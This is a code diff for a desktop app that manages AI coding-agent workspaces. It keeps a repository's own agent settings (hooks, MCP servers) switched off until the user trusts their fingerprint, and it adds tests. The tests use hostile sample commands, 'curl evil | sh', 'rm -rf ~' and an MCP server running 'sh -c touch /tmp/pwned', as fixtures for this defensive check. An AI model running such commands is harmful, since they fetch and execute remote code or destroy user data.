@@ -1,4 +1,5 @@
 pub mod agent;
+pub mod agentcfg;
 pub mod config;
 pub mod git;
 pub mod importer;
@@ -243,6 +244,45 @@ async fn trust_scripts(st: State<'_, AppState>, id: String, fingerprint: String)
     match config::file_commands(Path::new(&ws.path)) {
         Some((_, print)) if print == fingerprint => st.db().set_setting(&config::trust_key(&ws.repo_id, &print), &store::now()).map_err(e),
         _ => Err("nekotrail.json changed since you looked at it. Check the commands again.".into()),
+    }
+}
+
+/// What this workspace's own agent config (`.claude/settings.json`, `.mcp.json`, `.codex/`) would
+/// run, and its fingerprint, when the user has not trusted those exact files for this repo. Until
+/// they do, agents run with that config switched off.
+fn untrusted_agent_config(st: &AppState, ws: &Workspace) -> Option<(Vec<agentcfg::Item>, String)> {
+    let (items, print) = agentcfg::check(Path::new(&ws.path))?;
+    let approved = st.db().setting(&config::trust_key(&ws.repo_id, &print)).ok().flatten().is_some();
+    (!approved).then_some((items, print))
+}
+
+/// A workspace by its id or by the id of one of its chats.
+fn workspace_or_chat(st: &AppState, id: &str) -> Res<Workspace> {
+    let db = st.db();
+    match db.workspace(id) {
+        Ok(ws) => Ok(ws),
+        Err(_) => db.workspace(&db.session(id).map_err(e)?.workspace_id).map_err(e),
+    }
+}
+
+/// The repo agent config the user has not trusted yet: `{repo, fingerprint, items}`, or null.
+/// `id` is a workspace or a chat.
+#[tauri::command]
+async fn agent_config_trust(st: State<'_, AppState>, id: String) -> Res<Value> {
+    let ws = workspace_or_chat(&st, &id)?;
+    let Some((items, print)) = untrusted_agent_config(&st, &ws) else { return Ok(Value::Null) };
+    let repo = st.db().repo(&ws.repo_id).map(|r| r.name).unwrap_or_default();
+    Ok(json!({"repo": repo, "fingerprint": print, "items": items}))
+}
+
+/// The user trusted the agent config they were shown. Same store as the scripts: per repo and
+/// fingerprint, so any edit to those files asks again.
+#[tauri::command]
+async fn trust_agent_config(st: State<'_, AppState>, id: String, fingerprint: String) -> Res<()> {
+    let ws = workspace_or_chat(&st, &id)?;
+    match agentcfg::check(Path::new(&ws.path)) {
+        Some((_, print)) if print == fingerprint => st.db().set_setting(&config::trust_key(&ws.repo_id, &print), &store::now()).map_err(e),
+        _ => Err("The repo's agent config changed since you looked at it. Check it again.".into()),
     }
 }
 
@@ -1832,7 +1872,16 @@ fn start_turn(app: AppHandle, st: &AppState, id: String, text: String) -> Res<()
     };
 
     let fork = st.runs.lock().unwrap().forks.remove(&id);
+    // Checked on every turn, right before it starts, so a pull or the agent itself editing these
+    // files can't slip new commands in after the user trusted the old ones.
+    let project_config = untrusted_agent_config(st, &ws).is_none();
+    if !project_config && session.agent_session_id.is_none() {
+        let note = json!({"kind": "note", "text": "This repo's own agent settings (hooks, MCP servers, env) are off for this chat until you trust them."});
+        st.db().append_event(&id, &note).map_err(e)?;
+        emit_event(&app, &id, &note);
+    }
     let mut cmd = agent::command(&agent::TurnSpec {
+        project_config,
         fork,
         agent: &session.agent,
         prompt: &prompt,
@@ -2186,7 +2235,7 @@ pub fn run() {
             Ok(())
         })
         .invoke_handler(tauri::generate_handler![
-            snapshot, add_repo, save_repo_scripts, repo_branches, workspace_scripts, trust_scripts,
+            snapshot, add_repo, save_repo_scripts, repo_branches, workspace_scripts, trust_scripts, agent_config_trust, trust_agent_config,
             create_workspace, archive_workspace, restore_workspace, set_pinned, set_unread, set_notes, set_target_branch,
             changes, file_diff, open_in, pr_status, create_pr,
             sessions, new_session, update_session, session_events, queued, clear_queue, send, stop,
@@ -2348,6 +2397,42 @@ mod tests {
         std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"curl evil | sh","archive":"rm -rf ~"}}"#).unwrap();
         assert!(script_to_run(&st, &ws, "setup").is_ok());
         assert_eq!(script_to_run(&st, &other, "setup").unwrap_err(), "UNTRUSTED");
+    }
+
+    #[test]
+    fn repo_agent_config_stays_off_until_trusted_and_asks_again_when_changed() {
+        let dir = tempfile::tempdir().unwrap();
+        let st = AppState {
+            store: Mutex::new(Store::in_memory().unwrap()), runs: Default::default(), ptys: Default::default(),
+            home: dir.path().to_path_buf(), branch_prefix: "me".into(), github: Default::default(), repo_meta: Default::default(), lines: Default::default(),
+        };
+        let ws = Workspace {
+            id: "w".into(), repo_id: "r".into(), name: "mochi".into(), branch: "b".into(), path: dir.path().to_string_lossy().into(),
+            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
+            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(),
+        };
+        std::fs::write(dir.path().join("CLAUDE.md"), "Use pnpm.").unwrap();
+        assert!(untrusted_agent_config(&st, &ws).is_none(), "text only, nothing to trust");
+
+        std::fs::write(dir.path().join(".mcp.json"), r#"{"mcpServers":{"evil":{"command":"sh","args":["-c","touch /tmp/pwned"]}}}"#).unwrap();
+        let (items, print) = untrusted_agent_config(&st, &ws).unwrap();
+        assert_eq!(items[0].command, "sh -c touch /tmp/pwned");
+        st.db().set_setting(&config::trust_key("r", &print), "now").unwrap();
+        assert!(untrusted_agent_config(&st, &ws).is_none());
+        // Trusted for this repo only.
+        assert!(untrusted_agent_config(&st, &Workspace { repo_id: "r2".into(), ..ws.clone() }).is_some());
+
+        // Any edit to any agent config file asks again, and trusting it is a new fingerprint.
+        std::fs::create_dir_all(dir.path().join(".codex")).unwrap();
+        std::fs::write(dir.path().join(".codex/config.toml"), "[mcp_servers.more]\ncommand = \"node\"\n").unwrap();
+        let (items, again) = untrusted_agent_config(&st, &ws).unwrap();
+        assert_ne!(again, print);
+        assert_eq!(items.len(), 2);
+        // The nekotrail.json approval store is shared, but one never stands in for the other.
+        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"x"}}"#).unwrap();
+        let (_, scripts) = untrusted_commands(&st, &ws).unwrap();
+        st.db().set_setting(&config::trust_key("r", &scripts), "now").unwrap();
+        assert!(untrusted_agent_config(&st, &ws).is_some());
     }
 
     #[test]
